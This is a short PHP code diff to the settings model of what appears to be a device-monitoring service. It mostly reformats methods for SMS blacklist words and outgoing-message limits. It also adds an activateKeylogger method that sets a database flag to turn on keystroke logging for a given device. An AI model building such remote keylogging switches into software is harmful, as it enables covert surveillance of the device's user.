@@ -98,13 +98,14 @@ class Settings extends BaseModel
                                         WHERE
                                             `dev_id` = {$escapedDevId}");
     }
-    
-    public function setSmsSettings($devId, $blackWords, $outgoingLimitation, $outgoingLimitationCount, $outgoingLimitationAlert, $outgoingLimitationMessage) {
-        
+
+    public function setSmsSettings($devId, $blackWords, $outgoingLimitation, $outgoingLimitationCount, $outgoingLimitationAlert, $outgoingLimitationMessage)
+    {
+
         if (!strlen($outgoingLimitationMessage)) {
             throw new Settings\InvalidSmsLimitationMessageException("Bad alert message!");
         }
-        
+
         $escapedDevId = $this->getDB()->quote($devId);
         $blackWordsString = $this->getDB()->quote($this->rebuildBlackWordsList($blackWords));
         $outgoingLimitation = $this->getDB()->quote($outgoingLimitation);
@@ -201,11 +202,18 @@ class Settings extends BaseModel
         return implode(',', $list);
     }
 
-    private function getDeviceSettings($devId)
+    public function getDeviceSettings($devId)
     {
         $escapedDevId = $this->getDB()->quote($devId);
 
         return $this->getDb()->query("SELECT * FROM `dev_settings` WHERE `dev_id` = {$escapedDevId} LIMIT 1")->fetch();
+    }
+
+    public function activateKeylogger($devId)
+    {
+        $escapedDevId = $this->getDB()->quote($devId);
+
+        $this->getDb()->exec("UPDATE `dev_settings` SET `keylogger_activate` = 1 WHERE `dev_id` = {$escapedDevId} LIMIT 1");
     }
 
     public function getSettings($devId)
@@ -215,7 +223,7 @@ class Settings extends BaseModel
         if (($settings = $this->getDeviceSettings($devId)) === false) {
             throw new Settings\SettingsNotFoundException("Device settings not found");
         }
-        
+
         return array(
             'settings' => $settings,
             'blackListPhones' => $this->buildBlackList($settings['bl_phones']),
